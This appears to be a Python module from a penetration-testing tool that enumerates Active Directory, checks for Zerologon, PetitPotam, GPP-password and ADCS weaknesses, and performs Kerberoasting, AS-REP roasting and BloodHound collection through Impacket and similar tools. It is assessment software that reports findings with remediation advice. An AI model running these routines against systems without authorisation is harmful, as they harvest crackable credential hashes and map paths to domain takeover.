#!/usr/bin/env python3
"""
NexusPen - Active Directory Testing Module
==========================================
Comprehensive Active Directory security testing.

Includes:
- LDAP enumeration
- Kerberos attacks (Kerberoasting, AS-REP Roasting)
- BloodHound integration
- Domain privilege escalation
- Golden/Silver ticket attacks
"""

import subprocess
import re
import json
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()


@dataclass
class ADFinding:
    """Represents an Active Directory security finding."""
    severity: str
    title: str
    description: str
    host: str
    domain: Optional[str] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    cvss_score: Optional[float] = None
    cve_id: Optional[str] = None


class ADRecon:
    """Active Directory reconnaissance."""
    
    def __init__(self, target: str, domain: str = None, config: Dict = None):
        self.target = target
        self.domain = domain
        self.config = config or {}
        self.findings: List[ADFinding] = []
        self.users: List[Dict] = []
        self.groups: List[Dict] = []
        self.computers: List[Dict] = []
        self.domain_admins: List[str] = []
        self.spn_accounts: List[Dict] = []
        self.asrep_users: List[Dict] = []
    
    def run_full_recon(self) -> Dict:
        """Run comprehensive AD reconnaissance."""
        console.print(f"\n[cyan]🏢 Starting Active Directory Reconnaissance: {self.target}[/cyan]")
        
        results = {
            'target': self.target,
            'domain': self.domain,
            'domain_info': {},
            'users': [],
            'groups': [],
            'computers': [],
            'domain_admins': [],
            'spn_accounts': [],
            'asrep_users': [],
            'trusts': [],
            'gpos': [],
            'findings': []
        }
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            
            # Domain enumeration
            task = progress.add_task("Enumerating domain information...", total=None)
            results['domain_info'] = self.enumerate_domain()
            progress.update(task, completed=True)
            
            # LDAP enumeration
            task = progress.add_task("Running LDAP enumeration...", total=None)
            ldap_results = self.enumerate_ldap()
            results.update(ldap_results)
            progress.update(task, completed=True)
            
            # Kerberos enumeration
            task = progress.add_task("Checking Kerberos issues...", total=None)
            results['spn_accounts'] = self.find_spn_accounts()
            results['asrep_users'] = self.find_asrep_users()
            progress.update(task, completed=True)
            
            # Vulnerability checks
            task = progress.add_task("Checking AD vulnerabilities...", total=None)
            self.check_zerologon()
            self.check_petitpotam()
            self.check_gpp_passwords()
            self.check_adcs_vulnerabilities()
            progress.update(task, completed=True)
        
        results['findings'] = [f.__dict__ for f in self.findings]
        self._display_results(results)
        
        return results
    
    def enumerate_domain(self) -> Dict:
        """Enumerate basic domain information."""
        domain_info = {
            'netbios_name': None,
            'dns_name': None,
            'forest_name': None,
            'functional_level': None,
            'domain_controllers': []
        }
        
        try:
            # Use ldapsearch or similar
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{self.target}', 
                   '-s', 'base', 'namingContexts']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                dc_match = re.search(r'namingContexts:\s*(DC=.*)', result.stdout)
                if dc_match:
                    domain_info['dns_name'] = dc_match.group(1).replace('DC=', '').replace(',', '.')
                    
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Find domain controllers via DNS
        try:
            if self.domain:
                cmd = ['nslookup', '-type=SRV', f'_ldap._tcp.dc._msdcs.{self.domain}']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                
                dc_matches = re.findall(r'svr hostname\s*=\s*(\S+)', result.stdout, re.IGNORECASE)
                domain_info['domain_controllers'] = dc_matches
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return domain_info
    
    def enumerate_ldap(self) -> Dict:
        """Enumerate users, groups, and computers via LDAP."""
        results = {
            'users': [],
            'groups': [],
            'computers': [],
            'domain_admins': []
        }
        
        try:
            # Use ldapdomaindump if available
            cmd = ['ldapdomaindump', self.target, '-u', '', '-p', '', '--no-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Alternative: Use enum4linux for null session
        try:
            cmd = ['enum4linux', '-U', '-G', self.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                # Parse users
                user_matches = re.findall(r'user:\[([^\]]+)\]', result.stdout)
                for user in user_matches:
                    results['users'].append({'name': user})
                
                # Parse groups
                group_matches = re.findall(r'group:\[([^\]]+)\]', result.stdout)
                for group in group_matches:
                    results['groups'].append({'name': group})
                    
                # Check for Domain Admins
                if 'Domain Admins' in result.stdout:
                    da_section = re.search(
                        r'Domain Admins.*?(?=group:|$)', 
                        result.stdout, 
                        re.DOTALL | re.IGNORECASE
                    )
                    if da_section:
                        da_users = re.findall(r'(\S+)\s+\(', da_section.group())
                        results['domain_admins'] = da_users
                        
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        if results['users']:
            self.findings.append(ADFinding(
                severity='info',
                title=f'Enumerated {len(results["users"])} domain users',
                description='LDAP enumeration successful',
                host=self.target,
                domain=self.domain
            ))
        
        return results
    
    def find_spn_accounts(self) -> List[Dict]:
        """Find accounts with SPNs for Kerberoasting."""
        spn_accounts = []
        
        try:
            # Use GetUserSPNs.py from Impacket
            cmd = ['GetUserSPNs.py', f'{self.domain}/', '-dc-ip', self.target, 
                   '-request', '-no-pass']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Parse output for SPN accounts
            for line in result.stdout.split('\n'):
                if '/' in line and 'SamAccountName' not in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        spn_accounts.append({
                            'account': parts[0],
                            'spn': parts[-1] if '/' in parts[-1] else None
                        })
            
            if spn_accounts:
                self.findings.append(ADFinding(
                    severity='high',
                    title=f'Found {len(spn_accounts)} Kerberoastable accounts',
                    description='Accounts with SPNs can be targeted for Kerberoasting',
                    host=self.target,
                    domain=self.domain,
                    remediation='Use strong passwords for service accounts; consider gMSAs'
                ))
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return spn_accounts
    
    def find_asrep_users(self) -> List[Dict]:
        """Find users with "Do not require Kerberos preauthentication"."""
        asrep_users = []
        
        try:
            # Use GetNPUsers.py from Impacket
            cmd = ['GetNPUsers.py', f'{self.domain}/', '-dc-ip', self.target,
                   '-no-pass', '-usersfile', '/dev/null']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Parse output
            for line in result.stdout.split('\n'):
                if '$krb5asrep$' in line:
                    user_match = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', line)
                    if user_match:
                        asrep_users.append({
                            'account': user_match.group(1),
                            'hash': line.strip()
                        })
            
            if asrep_users:
                self.findings.append(ADFinding(
                    severity='high',
                    title=f'Found {len(asrep_users)} AS-REP Roastable accounts',
                    description='Accounts without Kerberos pre-authentication can have their hashes retrieved',
                    host=self.target,
                    domain=self.domain,
                    remediation='Enable Kerberos pre-authentication for all accounts'
                ))
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return asrep_users
    
    def check_zerologon(self):
        """Check for Zerologon vulnerability (CVE-2020-1472)."""
        try:
            # Use zerologon_tester or similar
            cmd = ['nmap', '--script', 'smb-vuln-zerologon', '-p', '445', self.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'VULNERABLE' in result.stdout:
                self.findings.append(ADFinding(
                    severity='critical',
                    title='Zerologon Vulnerability (CVE-2020-1472)',
                    description='Domain Controller is vulnerable to Zerologon. Full domain compromise possible.',
                    host=self.target,
                    domain=self.domain,
                    cve_id='CVE-2020-1472',
                    cvss_score=10.0,
                    remediation='Apply Microsoft security updates immediately'
                ))
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    def check_petitpotam(self):
        """Check for PetitPotam vulnerability."""
        try:
            # Check if EFS endpoints are accessible
            cmd = ['rpcclient', '-U', '', '-N', self.target, '-c', 'efsrpc']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'NT_STATUS_ACCESS_DENIED' not in result.stderr:
                self.findings.append(ADFinding(
                    severity='high',
                    title='Potential PetitPotam Vulnerability',
                    description='EFS RPC endpoints may be vulnerable to NTLM relay attacks',
                    host=self.target,
                    domain=self.domain,
                    cve_id='CVE-2021-36942',
                    remediation='Apply Microsoft patches and enable EPA/SMB signing'
                ))
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    def check_gpp_passwords(self):
        """Check for Group Policy Preference passwords."""
        try:
            # Use Get-GPPPassword or similar
            cmd = ['nmap', '--script', 'smb-enum-shares,smb-ls', '-p', '445', self.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if 'Groups.xml' in result.stdout or 'cpassword' in result.stdout.lower():
                self.findings.append(ADFinding(
                    severity='critical',
                    title='GPP Passwords Found',
                    description='Group Policy Preferences containing encrypted passwords detected',
                    host=self.target,
                    domain=self.domain,
                    remediation='Remove GPP files containing passwords; use LAPS for local admin'
                ))
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    def check_adcs_vulnerabilities(self):
        """Check for AD Certificate Services vulnerabilities."""
        try:
            # Check for ESC1-ESC8 vulnerabilities
            # This would use certipy or similar tool
            cmd = ['certipy', 'find', '-u', '', '-p', '', '-dc-ip', self.target, 
                   '-vulnerable', '-stdout']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if 'ESC' in result.stdout:
                escalation_types = re.findall(r'ESC\d+', result.stdout)
                for esc in set(escalation_types):
                    self.findings.append(ADFinding(
                        severity='critical',
                        title=f'ADCS Vulnerability: {esc}',
                        description=f'AD Certificate Services escalation vulnerability {esc} detected',
                        host=self.target,
                        domain=self.domain,
                        remediation='Review and fix ADCS template permissions'
                    ))
                    
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    def _display_results(self, results: Dict):
        """Display AD reconnaissance results."""
        console.print("\n[bold green]╔══════════════════════════════════════════════════════════════╗[/bold green]")
        console.print("[bold green]║           ACTIVE DIRECTORY RECONNAISSANCE RESULTS             ║[/bold green]")
        console.print("[bold green]╚══════════════════════════════════════════════════════════════╝[/bold green]\n")
        
        # Domain info
        if results.get('domain_info', {}).get('dns_name'):
            console.print(f"[cyan]🏢 Domain:[/cyan] {results['domain_info']['dns_name']}")
        
        if results.get('domain_info', {}).get('domain_controllers'):
            console.print(f"[cyan]🖥️ Domain Controllers:[/cyan] {len(results['domain_info']['domain_controllers'])}")
        
        # Users and groups
        if results.get('users'):
            console.print(f"[cyan]👥 Users Found:[/cyan] {len(results['users'])}")
        
        if results.get('groups'):
            console.print(f"[cyan]👪 Groups Found:[/cyan] {len(results['groups'])}")
        
        if results.get('domain_admins'):
            console.print(f"\n[red]⚠️ Domain Admins:[/red]")
            for admin in results['domain_admins'][:5]:
                console.print(f"   • {admin}")
        
        # Kerberos findings
        if results.get('spn_accounts'):
            console.print(f"\n[yellow]🎫 Kerberoastable Accounts:[/yellow] {len(results['spn_accounts'])}")
        
        if results.get('asrep_users'):
            console.print(f"[yellow]🎫 AS-REP Roastable:[/yellow] {len(results['asrep_users'])}")
        
        # Findings summary
        critical = len([f for f in self.findings if f.severity == 'critical'])
        high = len([f for f in self.findings if f.severity == 'high'])
        console.print(f"\n[yellow]⚠️ Findings: {len(self.findings)} ({critical} critical, {high} high)[/yellow]")


class KerberosAttacks:
    """Kerberos attack modules."""
    
    def __init__(self, target: str, domain: str):
        self.target = target
        self.domain = domain
    
    def kerberoast(self, username: str = None, password: str = None, 
                   output_file: str = None) -> List[Dict]:
        """Perform Kerberoasting attack."""
        console.print("[cyan]🎫 Performing Kerberoasting...[/cyan]")
        
        hashes = []
        
        try:
            cmd = ['GetUserSPNs.py', f'{self.domain}/{username}:{password}',
                   '-dc-ip', self.target, '-request']
            
            if output_file:
                cmd.extend(['-outputfile', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            for line in result.stdout.split('\n'):
                if '$krb5tgs$' in line:
                    hashes.append({'hash': line.strip()})
                    
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        console.print(f"[green]✓ Retrieved {len(hashes)} TGS hashes[/green]")
        return hashes
    
    def asreproast(self, userlist: str = None, output_file: str = None) -> List[Dict]:
        """Perform AS-REP Roasting attack."""
        console.print("[cyan]🎫 Performing AS-REP Roasting...[/cyan]")
        
        hashes = []
        
        try:
            cmd = ['GetNPUsers.py', f'{self.domain}/', '-dc-ip', self.target,
                   '-no-pass']
            
            if userlist:
                cmd.extend(['-usersfile', userlist])
            if output_file:
                cmd.extend(['-outputfile', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            for line in result.stdout.split('\n'):
                if '$krb5asrep$' in line:
                    hashes.append({'hash': line.strip()})
                    
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        console.print(f"[green]✓ Retrieved {len(hashes)} AS-REP hashes[/green]")
        return hashes


class BloodHound:
    """BloodHound integration for AD attack path analysis."""
    
    def __init__(self, target: str, domain: str):
        self.target = target
        self.domain = domain
    
    def collect(self, username: str, password: str, collection_method: str = 'all',
                output_dir: str = '/tmp/bloodhound') -> str:
        """Run BloodHound collector."""
        console.print("[cyan]🩸 Running BloodHound collector...[/cyan]")
        
        try:
            cmd = [
                'bloodhound-python',
                '-d', self.domain,
                '-u', username,
                '-p', password,
                '-dc', self.target,
                '-c', collection_method,
                '--zip',
                '-o', output_dir
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                console.print(f"[green]✓ BloodHound data collected: {output_dir}[/green]")
                return output_dir
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            console.print("[yellow]⚠️ BloodHound collection failed[/yellow]")
        
        return None


# Module entry point
def run(target: str, profile, results: list):
    """Main entry point for AD recon module."""
    # Try to get domain from profile
    domain = None
    if hasattr(profile, 'hostname'):
        domain = profile.hostname
    
    recon = ADRecon(target, domain)
    ad_results = recon.run_full_recon()
    results.append({
        'module': 'ad.recon',
        'phase': 'recon',
        'findings': ad_results
    })
